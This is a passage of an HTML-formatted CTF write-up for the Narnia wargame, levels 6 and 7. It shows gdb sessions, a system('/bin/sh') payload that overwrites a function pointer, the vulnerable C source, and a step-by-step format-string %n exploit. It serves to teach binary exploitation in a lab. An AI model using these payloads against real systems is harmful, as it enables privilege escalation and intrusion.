$&lt;span style=&#34;color: #f8f8f2&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; 0xf7e62cd0 &amp;lt;system&amp;gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;What I did here was to disassemble the &lt;code&gt;main&lt;/code&gt; function and find out where
&lt;code&gt;fp&lt;/code&gt; is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to &lt;code&gt;fp&lt;/code&gt;. What we see is
that &lt;code&gt;$esp&lt;/code&gt; points to &lt;code&gt;0xffffd6a0&lt;/code&gt;, which is where the last 4 values of
&lt;code&gt;b2&lt;/code&gt; are stored. This is also the argument that will be passed to the &lt;code&gt;fp&lt;/code&gt; call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to &lt;code&gt;/bin/sh&lt;/code&gt;, and we want &lt;code&gt;fp&lt;/code&gt; to point to &lt;code&gt;system&lt;/code&gt;. This is
the reason for the &lt;code&gt;p system&lt;/code&gt;, it tells us the location of &lt;code&gt;system&lt;/code&gt;.
Also note that our &lt;code&gt;segfault&lt;/code&gt; is showing us the last
4 digits of &lt;code&gt;b1&lt;/code&gt;. Perfect, I can use that to overwrite &lt;code&gt;fp&lt;/code&gt; with the address of
&lt;code&gt;system&lt;/code&gt; and I should be good to go.&lt;/p&gt;

&lt;p&gt;As this is a little more advanced, let&amp;rsquo;s go over the steps:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Get the address of the argument to whatever &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;Figure out how to overwrite that with our argument&lt;/li&gt;
&lt;li&gt;Get the address of &lt;code&gt;system&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overwrite what &lt;code&gt;fp&lt;/code&gt; points to with &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address&lt;/li&gt;
&lt;li&gt;Assemble payload and hopefully get a shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the last step:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ /games/narnia/narnia6 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;a&amp;#39;*8 + &amp;#39;\xd0\x2c\xe6\xf7&amp;#39; +&amp;#39; &amp;#39;+ &amp;#39;b&amp;#39;*8 + &amp;#39;/bin/sh&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-07:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;vuln&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;format){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf)();&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(buffer,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;goodfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hackedfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hackedfunction);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;before : ptrf() = %p (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I guess you want to come to the hackedfunction...&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sleep(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;format);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf();&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;fprintf(stderr,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s &amp;lt;buffer&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(vuln(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]));&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Welcome to the goodfunction, but i said the Hackedfunction..&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Way to go!!!!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The presence of &lt;code&gt;snprintf&lt;/code&gt; indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&amp;rsquo;s attack this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &amp;lt;+0&amp;gt;:	push   %ebp
   0x080485ce &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x080485d0 &amp;lt;+3&amp;gt;:	sub    $0xa8,%esp
   0x080485d6 &amp;lt;+9&amp;gt;:	movl   $0x80,0x8(%esp)
   0x080485de &amp;lt;+17&amp;gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &amp;lt;+25&amp;gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &amp;lt;+31&amp;gt;:	mov    %eax,(%esp)
   0x080485ef &amp;lt;+34&amp;gt;:	call   0x80484b0 &amp;lt;memset@plt&amp;gt;
   0x080485f4 &amp;lt;+39&amp;gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &amp;lt;+47&amp;gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &amp;lt;+54&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048608 &amp;lt;+59&amp;gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &amp;lt;+67&amp;gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &amp;lt;+74&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x0804861c &amp;lt;+79&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &amp;lt;+89&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &amp;lt;+95&amp;gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &amp;lt;+101&amp;gt;:	mov    %edx,0x8(%esp)
   0x08048636 &amp;lt;+105&amp;gt;:	mov    %eax,0x4(%esp)
   0x0804863a &amp;lt;+109&amp;gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &amp;lt;+116&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048646 &amp;lt;+121&amp;gt;:	movl   $0x8048818,(%esp)
   0x0804864d &amp;lt;+128&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x08048652 &amp;lt;+133&amp;gt;:	movl   $0x2,(%esp)
   0x08048659 &amp;lt;+140&amp;gt;:	call   0x8048440 &amp;lt;sleep@plt&amp;gt;
   0x0804865e &amp;lt;+145&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &amp;lt;+155&amp;gt;:	mov    0x8(%ebp),%eax
   0x0804866b &amp;lt;+158&amp;gt;:	mov    %eax,0x8(%esp)
   0x0804866f &amp;lt;+162&amp;gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &amp;lt;+170&amp;gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &amp;lt;+176&amp;gt;:	mov    %eax,(%esp)
   0x08048680 &amp;lt;+179&amp;gt;:	call   0x80484c0 &amp;lt;snprintf@plt&amp;gt;
   0x08048685 &amp;lt;+184&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &amp;lt;+190&amp;gt;:	call   *%eax
   0x0804868d &amp;lt;+192&amp;gt;:	leave  
   0x0804868e &amp;lt;+193&amp;gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So disassmble the &lt;code&gt;vuln&lt;/code&gt; function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of &lt;code&gt;%x&lt;/code&gt; you need. Using
&lt;code&gt;ltrace&lt;/code&gt; it&amp;rsquo;s possible to increment the number of &lt;code&gt;%x&lt;/code&gt;&amp;rsquo;s until you
see your string in the output again. I&amp;rsquo;ll paste only the correcy output here&lt;/p&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ ltrace ./narnia7 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;`&lt;/span&gt;
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &amp;lt;unfinished ...&amp;gt;
memset(0xffffd630, &amp;#39;\0&amp;#39;, 128)                                = 0xffffd630
printf(&amp;quot;goodfunction() = %p\n&amp;quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&amp;quot;hackedfunction() = %p\n\n&amp;quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&amp;quot;before : ptrf() = %p (%p)\n&amp;quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&amp;quot;I guess you want to come to the &amp;quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&amp;quot;aaaabbbb8048238ffffd688f7ffda940&amp;quot;..., 128, &amp;quot;aaaabbbb%x%x%x%x%x%x%x&amp;quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&amp;quot;Welcome to the goodfunction, but&amp;quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &amp;lt;no return ...&amp;gt;
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;You can see the &lt;em&gt;aaaa&lt;/em&gt; and &lt;em&gt;bbbb&lt;/em&gt; at line 14. So we have 7 &lt;code&gt;%x&lt;/code&gt; to get the second value.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at the stack with that input&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So at &lt;code&gt;0xffffd60c&lt;/code&gt; is the address of &lt;code&gt;goodfunction&lt;/code&gt;. We need to overwrite that
to point to &lt;code&gt;0x8048706&lt;/code&gt;, our &lt;code&gt;hackedfunction&lt;/code&gt;. So as before in &lt;a href=&#34;http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05&#34;&gt;level 05&lt;/a&gt;
we use &lt;code&gt;%n&lt;/code&gt; to try and overwrite this value.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The value of &lt;em&gt;2f&lt;/em&gt; at &lt;code&gt;0xffffd60c&lt;/code&gt; shows us that our overwrite was successful
and we wrote the value of &lt;em&gt;47&lt;/em&gt;. We need to write &lt;code&gt;0x8048706&lt;/code&gt; which is &lt;em&gt;134514438&lt;/em&gt; in decimal.
So let&amp;rsquo;s add our &lt;code&gt;%d&lt;/code&gt; in and remember to adjust the number of &lt;code&gt;%x&lt;/code&gt;s too, so we can see
how much padding we need&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, so &lt;code&gt;0x8048706 - 0x00000031 = 0x80486d6&lt;/code&gt; or &lt;em&gt;134514389&lt;/em&gt; in decimal.
Let&amp;rsquo;s see if I&amp;rsquo;m right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Still a little off. Adjusting the value again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
